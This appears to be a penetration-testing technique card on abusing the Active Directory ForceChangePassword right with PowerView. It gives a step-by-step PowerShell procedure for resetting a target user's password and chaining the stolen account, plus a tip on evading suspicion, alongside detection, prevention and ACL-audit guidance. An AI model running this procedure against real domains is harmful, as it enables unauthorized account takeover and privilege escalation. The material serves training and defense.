name: PowerView - Abuse ForceChangePassword ACL
description: Resets a target user's password using the ForceChangePassword extended right (or GenericAll/AllExtendedRights). Does NOT require knowledge of the current password. Used when your controlled principal has this right over a higher-privilege account. Creates a Kerberos ticket change event but no failed-logon noise.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== WHAT FORCECHANGEPASSWORD MEANS ===
The 'User-Force-Change-Password' extended right allows the holder to set any new
password for the target account WITHOUT needing to know the current password.
In ADUC, this appears as 'Reset password' in the delegation wizard.

This right is sometimes granted to help desk staff, but also gets misconfigured
onto random service accounts or domain users through careless delegation.

=== PREREQUISITES ===
  1. You control a user (wley) who has ForceChangePassword over the target (damundsen)
  2. Create PSCredential for wley: ad-acl-pscredential
  3. Create a SecureString for the new password

=== FULL PROCEDURE ===
# Step 1: Create credential for the rights-holding account (wley)
$SecPassword = ConvertTo-SecureString 'transitioner' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Step 2: Create the new password as SecureString
$NewPass = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Step 3: Set the password
Set-DomainUserPassword -Identity damundsen -AccountPassword $NewPass -Credential $Cred -Verbose

# Step 4: Create new cred for damundsen and continue chain
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $NewPass)

=== DETECTION RISK ===
Password resets generate Windows Event 4723 (account password changed) or
4724 (account password reset by administrator). These can be alerted on,
but are also common in corporate environments — not guaranteed to be caught.
The account may also have active sessions that get terminated, alerting the user.

=== CHAIN POSITION ===
After: enumerate ACLs (Find-InterestingDomainAcl), identify wley→damundsen
After: create PSCredential for wley (ad-acl-pscredential)
Before: use damundsen's new creds to continue the chain (add to groups, etc.)

recommended.note: Log in as the reset account.

defense.why_it_works: Abuses the ForceChangePassword extended right (Set-DomainUserPassword) to reset a target user's password WITHOUT knowing the current one, taking over the account.
defense.prerequisites: ForceChangePassword (or GenericAll) over the target user object.
defense.impact: Full control of the target account via a password reset - a foothold or escalation step.
defense.detection: [MITRE T1098] Event 4724 (password-reset attempt) and 4738 (account changed) where the actor is NOT an admin/help-desk; a reset of a privileged/service account.
defense.artifacts: 4724/4738 events; the reset target; PowerView/net execution.
defense.prevention: Audit and remove ForceChangePassword/GenericAll grants; monitor 4724 on sensitive accounts; alert on non-admin password resets.
defense.evasion: Resetting a low-profile account and doing so during business hours reduces suspicion; note the reset itself is always logged.
defense.misconfiguration: Non-privileged users or groups have been granted sensitive AD object permissions (WriteDACL, GenericAll, GenericWrite, ForceChangePassword, AddMember, etc.) through misconfigured delegation, 'inherited from parent' ACEs copied at provisioning time, or direct one-off grants. Because AD ACEs are not surfaced in the normal GUI, these often persist for years.
defense.vulnerable_config:
# Example: a help-desk group has ForceChangePassword on Domain Admins members
# Found via BloodHound 'ForceChangePassword' edge, or PowerView:
Get-ObjectAcl -Identity 'Domain Admins' -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match 'ResetPassword'} |
  Select-Object IdentityReference, ActiveDirectoryRights, ObjectType

# Another dangerous pattern — GenericWrite on a user (enables targeted Kerberoasting):
Get-ObjectAcl -Identity 'svc_sql' -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match 'GenericWrite'}
defense.secure_config:
# 1. Run AD ACL audit quarterly (automated):
# BloodHound: Mark all Domain Admins as 'High Value', find paths from low-priv users
# PowerView batch:
Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'} |
  Where-Object {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'} |
  Export-Csv acl_review.csv

# 2. Remove dangerous ACEs:
Remove-DomainObjectAcl -TargetIdentity 'svc_sql' \
    -PrincipalIdentity 'helpdesk' -Rights GenericWrite

# 3. Enable AD Protected Users group for privileged accounts
# 4. Use tiered administration (Admin Tier 0/1/2) to limit blast radius
